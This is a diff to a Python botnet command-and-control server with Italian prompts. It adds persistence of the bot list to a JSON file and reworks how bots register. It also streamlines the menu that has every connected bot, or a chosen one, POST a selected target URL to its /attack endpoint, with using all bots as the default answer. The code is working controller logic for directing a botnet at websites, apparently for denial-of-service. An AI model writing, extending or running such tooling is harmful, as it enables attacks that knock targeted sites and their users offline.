@@ -11,6 +11,18 @@ server_address = ('localhost', 15200)
 clients = []
 
 
+def write_on_json_file(data):
+    with open("bot-db.json", "w") as f:
+        json.dump(data, f)
+
+
+def initialize_bot_list():
+    with open("bot-db.json", "r") as f:
+        data = json.load(f)
+        for client in data:
+            clients.append((client[0], client[1]))
+
+
 def initialize(e):
     """
     Initialize the server and listen for incoming connections.
@@ -19,6 +31,9 @@ def initialize(e):
     s.bind((server_address[0], server_address[1]))
     s.listen(5)
     s.settimeout(2)
+
+    # initialize_bot_list()
+
     while not e.is_set():
         try:
             client, address = s.accept()
@@ -28,14 +43,11 @@ def initialize(e):
 
             bot = (address[0], data['port'])
 
-            print("--------------------------------------")
-            if address[0] not in clients:
+            if bot not in clients:
                 clients.append(bot)
-                print(f"Bot connected: {bot}")
-            else:
-                clients.remove(bot)
-                print(f"Bot disconnected: {bot}")
-            print("--------------------------------------")
+
+                # write_on_json_file(clients)
+
         except socket.timeout:
             continue
 
@@ -123,28 +135,15 @@ def send_http_request():
             print("Nessun URL da attaccare")
             return
 
-        print("1. Attacca tutti gli URL")
-        print("2. Attacca un URL specifico")
+        print("Seleziona un URL da attaccare: ")
+        for key, url in enumerate(urls):
+            print(f"{key + 1}. {url}")
 
-        scelta = int(input())
+        url = urls[int(input()) - 1]
 
-        if scelta == 1:
-            for url in urls:
-                for client in clients:
-                    requests.post(f"http://{client[0]}:{client[1]}/attack", json={
-                        'url': url
-                    })
-
-        else:
-            print("Seleziona un URL da attaccare: ")
-            for key, url in enumerate(urls):
-                print(f"{key + 1}. {url}")
-
-            url = urls[int(input()) - 1]
-
-            find_bot(path='attack', method="POST", j={
-                'url': url
-            })
+        find_bot(path='attack', method="POST", j={
+            'url': url
+        })
 
 
 def print_client_info(client, res):
@@ -185,7 +184,7 @@ def find_bot(path, method, j=None):
         print("Nessun bot connesso")
         return
 
-    if input("Voi utilizzare tutti i bot connessi? S/N: ") in ["S", "s"]:
+    if input("Voi utilizzare tutti i bot connessi? S/n: ") in ["S", "s", ""]:
         if method == "GET":
             for client in clients:
                 res = requests.get(f"http://{client[0]}:{client[1]}/{path}")
